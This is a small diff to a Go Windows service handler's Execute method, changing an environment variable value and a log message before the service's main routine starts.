@@ -19,8 +19,8 @@ type svcHandler struct {
 func (m *svcHandler) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
 	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
 	changes <- svc.Status{State: svc.StartPending}
-	os.Setenv("nocheck", "poly")
-	log.Println("Goroutine started")
+	os.Setenv("poly", "poly")
+	log.Println("Polymorphic main call")
 	go m.main()
 	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
 
